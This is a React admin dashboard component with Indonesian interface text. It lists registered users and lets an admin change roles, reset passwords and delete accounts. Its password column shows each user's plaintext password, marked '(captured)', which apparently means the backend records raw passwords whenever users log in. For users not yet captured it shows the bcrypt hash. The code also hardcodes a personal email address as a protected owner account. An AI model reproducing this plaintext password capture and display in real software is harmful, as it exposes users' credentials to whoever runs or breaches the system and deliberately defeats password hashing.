"use client";

import { useEffect, useState, useCallback } from "react";

interface AccountUser {
  id: string;
  email: string;
  username: string;
  role: "user" | "premium" | "admin";
  createdAt: string;
  passwordRaw: string | null;
  passwordHash: string;
}

export default function AdminAccountChecker() {
  const [users, setUsers] = useState<AccountUser[]>([]);
  const [search, setSearch] = useState("");
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);

  // Edit / Reset States
  const [editingUserId, setEditingUserId] = useState<string | null>(null);
  const [newPasswordVal, setNewPasswordVal] = useState("");
  const [showConfirmDelete, setShowConfirmDelete] = useState<string | null>(null);

  const fetchUsers = useCallback(async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/admin/users");
      if (!res.ok) {
        if (res.status === 403) throw new Error("Akses ditolak. Khusus Admin.");
        throw new Error("Gagal mengambil data akun");
      }
      const data = (await res.json()) as { users: AccountUser[] };
      setUsers(data.users);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Terjadi kesalahan");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchUsers();
  }, [fetchUsers]);

  const handleUpdateRole = async (email: string, role: "user" | "premium" | "admin") => {
    setActionLoading(`role-${email}`);
    try {
      const res = await fetch("/api/admin/users/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, role }),
      });
      if (!res.ok) {
        const errData = (await res.json()) as { error?: string };
        throw new Error(errData.error || "Gagal memperbarui role");
      }
      await fetchUsers();
    } catch (err) {
      alert(err instanceof Error ? err.message : "Gagal memperbarui role");
    } finally {
      setActionLoading(null);
    }
  };

  const handleResetPassword = async (email: string) => {
    if (newPasswordVal.length < 8) {
      alert("Password baru minimal harus 8 karakter!");
      return;
    }
    setActionLoading(`pass-${email}`);
    try {
      const res = await fetch("/api/admin/users/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, newPassword: newPasswordVal }),
      });
      if (!res.ok) {
        const errData = (await res.json()) as { error?: string };
        throw new Error(errData.error || "Gagal mereset password");
      }
      setEditingUserId(null);
      setNewPasswordVal("");
      alert("Password berhasil diubah!");
      await fetchUsers();
    } catch (err) {
      alert(err instanceof Error ? err.message : "Gagal mereset password");
    } finally {
      setActionLoading(null);
    }
  };

  const handleDeleteUser = async (email: string) => {
    setActionLoading(`delete-${email}`);
    try {
      const res = await fetch("/api/admin/users", {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });
      if (!res.ok) {
        const errData = (await res.json()) as { error?: string };
        throw new Error(errData.error || "Gagal menghapus user");
      }
      setShowConfirmDelete(null);
      await fetchUsers();
    } catch (err) {
      alert(err instanceof Error ? err.message : "Gagal menghapus user");
    } finally {
      setActionLoading(null);
    }
  };

  const filteredUsers = users.filter((u) => {
    const term = search.toLowerCase();
    return u.username.toLowerCase().includes(term) || u.email.toLowerCase().includes(term);
  });

  const formatDate = (isoString: string) => {
    try {
      return new Date(isoString).toLocaleDateString("id-ID", {
        year: "numeric",
        month: "short",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      });
    } catch {
      return isoString;
    }
  };

  return (
    <div className="uploader">
      <div className="uploader__hero" style={{ marginBottom: "20px" }}>
        <h2>🛡️ Account Checker (Admin Platform)</h2>
        <p>Dashboard khusus admin untuk memantau, memeriksa detail login, dan mengelola semua akun terdaftar.</p>
      </div>

      {error && (
        <div className="status status--error" style={{ marginBottom: "16px" }}>
          ⚠️ {error}
        </div>
      )}

      {/* Control Bar */}
      <div
        style={{
          display: "flex",
          gap: "12px",
          marginBottom: "20px",
          background: "var(--surface)",
          border: "1px solid var(--border)",
          padding: "12px 16px",
          borderRadius: "var(--radius)",
          alignItems: "center",
          justifyContent: "space-between",
          flexWrap: "wrap",
        }}
      >
        <div style={{ position: "relative", flex: 1, minWidth: "260px" }}>
          <input
            type="text"
            placeholder="Cari email atau username..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            style={{
              width: "100%",
              padding: "8px 12px",
              background: "var(--bg-secondary)",
              border: "1px solid var(--border)",
              borderRadius: "6px",
              color: "var(--text)",
              fontSize: "13px",
            }}
          />
        </div>

        <div style={{ display: "flex", gap: "10px" }}>
          <button
            type="button"
            className="btn"
            onClick={fetchUsers}
            disabled={loading}
            style={{
              padding: "8px 16px",
              fontSize: "13px",
              background: "var(--bg-secondary)",
              border: "1px solid var(--border)",
            }}
          >
            {loading ? "Refreshing..." : "🔄 Refresh"}
          </button>
          <span
            style={{
              alignSelf: "center",
              fontSize: "12px",
              fontWeight: "600",
              color: "var(--text-muted)",
            }}
          >
            Total: {filteredUsers.length} user
          </span>
        </div>
      </div>

      {/* Users Table */}
      {loading && users.length === 0 ? (
        <div style={{ textAlign: "center", padding: "40px", color: "var(--text-muted)" }}>
          <span className="spinner" style={{ marginBottom: "12px" }} />
          <div>Memuat data akun...</div>
        </div>
      ) : (
        <div style={{ overflowX: "auto", border: "1px solid var(--border)", borderRadius: "var(--radius)", background: "var(--surface)" }}>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "13px", textAlign: "left" }}>
            <thead>
              <tr style={{ background: "var(--bg-secondary)", borderBottom: "1px solid var(--border)" }}>
                <th style={{ padding: "12px 16px", color: "var(--text-muted)" }}>User & Email</th>
                <th style={{ padding: "12px 16px", color: "var(--text-muted)" }}>Password (Plain/Bcrypt)</th>
                <th style={{ padding: "12px 16px", color: "var(--text-muted)" }}>Role</th>
                <th style={{ padding: "12px 16px", color: "var(--text-muted)" }}>Terdaftar Pada</th>
                <th style={{ padding: "12px 16px", color: "var(--text-muted)", textAlign: "right" }}>Tindakan</th>
              </tr>
            </thead>
            <tbody>
              {filteredUsers.length === 0 ? (
                <tr>
                  <td colSpan={5} style={{ padding: "30px", textAlign: "center", color: "var(--text-muted)" }}>
                    Tidak ada akun yang cocok.
                  </td>
                </tr>
              ) : (
                filteredUsers.map((u) => {
                  const isEditing = editingUserId === u.id;
                  const isConfirmingDelete = showConfirmDelete === u.id;

                  return (
                    <tr key={u.id} style={{ borderBottom: "1px solid var(--border)", transition: "background 0.2s" }}>
                      {/* Username & Email */}
                      <td style={{ padding: "12px 16px" }}>
                        <div style={{ fontWeight: "700", color: "var(--text)" }}>{u.username}</div>
                        <div style={{ fontSize: "11px", color: "var(--text-muted)", marginTop: "2px" }}>{u.email}</div>
                      </td>

                      {/* Password */}
                      <td style={{ padding: "12px 16px" }}>
                        {u.passwordRaw ? (
                          <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                            <span style={{ fontFamily: "monospace", color: "#4ade80", background: "rgba(74,222,128,0.12)", padding: "2px 6px", borderRadius: "4px", fontSize: "12px", fontWeight: "700" }}>
                              {u.passwordRaw}
                            </span>
                            <span style={{ fontSize: "10px", color: "var(--text-muted)" }}>(captured)</span>
                          </div>
                        ) : (
                          <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
                            <span style={{ fontSize: "11px", color: "var(--text-muted)", fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", maxWidth: "200px", whiteSpace: "nowrap" }} title={u.passwordHash}>
                              {u.passwordHash}
                            </span>
                            <span style={{ fontSize: "10px", color: "var(--error)" }}>🔑 bcrypt hash (belum login ulang)</span>
                          </div>
                        )}
                      </td>

                      {/* Role Badge */}
                      <td style={{ padding: "12px 16px" }}>
                        <select
                          value={u.role}
                          onChange={(e) => handleUpdateRole(u.email, e.target.value as "user" | "premium" | "admin")}
                          disabled={actionLoading === `role-${u.email}` || u.email === "nixxeltzy@gmail.com"}
                          style={{
                            padding: "4px 8px",
                            background: u.role === "admin" ? "rgba(236,72,153,0.15)" : u.role === "premium" ? "rgba(124,58,237,0.15)" : "var(--bg-secondary)",
                            color: u.role === "admin" ? "#ec4899" : u.role === "premium" ? "#8b5cf6" : "var(--text)",
                            border: "1px solid var(--border)",
                            borderRadius: "4px",
                            fontWeight: "600",
                            fontSize: "12px",
                            cursor: "pointer",
                          }}
                        >
                          <option value="user">Free User</option>
                          <option value="premium">Premium</option>
                          <option value="admin">Admin</option>
                        </select>
                      </td>

                      {/* Created At */}
                      <td style={{ padding: "12px 16px", color: "var(--text-muted)" }}>
                        {formatDate(u.createdAt)}
                      </td>

                      {/* Actions */}
                      <td style={{ padding: "12px 16px", textAlign: "right" }}>
                        {isEditing ? (
                          <div style={{ display: "flex", gap: "6px", justifyContent: "flex-end", alignItems: "center" }}>
                            <input
                              type="text"
                              placeholder="Pass baru..."
                              value={newPasswordVal}
                              onChange={(e) => setNewPasswordVal(e.target.value)}
                              style={{
                                padding: "4px 8px",
                                background: "var(--bg-secondary)",
                                border: "1px solid var(--border)",
                                borderRadius: "4px",
                                color: "var(--text)",
                                width: "110px",
                                fontSize: "12px",
                              }}
                            />
                            <button
                              type="button"
                              onClick={() => handleResetPassword(u.email)}
                              disabled={actionLoading === `pass-${u.email}`}
                              style={{ padding: "4px 8px", background: "#4ade80", border: "none", borderRadius: "4px", color: "black", fontSize: "11px", fontWeight: "700", cursor: "pointer" }}
                            >
                              Simpan
                            </button>
                            <button
                              type="button"
                              onClick={() => { setEditingUserId(null); setNewPasswordVal(""); }}
                              style={{ padding: "4px 8px", background: "var(--bg-secondary)", border: "1px solid var(--border)", borderRadius: "4px", color: "var(--text)", fontSize: "11px", cursor: "pointer" }}
                            >
                              Batal
                            </button>
                          </div>
                        ) : isConfirmingDelete ? (
                          <div style={{ display: "flex", gap: "6px", justifyContent: "flex-end", alignItems: "center" }}>
                            <span style={{ fontSize: "11px", color: "var(--error)", fontWeight: "600" }}>Yakin hapus?</span>
                            <button
                              type="button"
                              onClick={() => handleDeleteUser(u.email)}
                              disabled={actionLoading === `delete-${u.email}`}
                              style={{ padding: "4px 8px", background: "var(--error)", border: "none", borderRadius: "4px", color: "white", fontSize: "11px", fontWeight: "700", cursor: "pointer" }}
                            >
                              Ya
                            </button>
                            <button
                              type="button"
                              onClick={() => setShowConfirmDelete(null)}
                              style={{ padding: "4px 8px", background: "var(--bg-secondary)", border: "1px solid var(--border)", borderRadius: "4px", color: "var(--text)", fontSize: "11px", cursor: "pointer" }}
                            >
                              Tidak
                            </button>
                          </div>
                        ) : (
                          <div style={{ display: "flex", gap: "8px", justifyContent: "flex-end" }}>
                            <button
                              type="button"
                              onClick={() => setEditingUserId(u.id)}
                              style={{
                                padding: "4px 8px",
                                background: "var(--bg-secondary)",
                                border: "1px solid var(--border)",
                                borderRadius: "4px",
                                color: "var(--text)",
                                cursor: "pointer",
                                fontSize: "11px",
                              }}
                            >
                              🔑 Reset Pass
                            </button>

                            {u.email !== "nixxeltzy@gmail.com" && (
                              <button
                                type="button"
                                onClick={() => setShowConfirmDelete(u.id)}
                                style={{
                                  padding: "4px 8px",
                                  background: "rgba(239,68,68,0.15)",
                                  border: "1px solid var(--error)",
                                  color: "var(--error)",
                                  borderRadius: "4px",
                                  cursor: "pointer",
                                  fontSize: "11px",
                                  fontWeight: "600",
                                }}
                              >
                                🗑️ Hapus
                              </button>
                            )}
                          </div>
                        )}
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
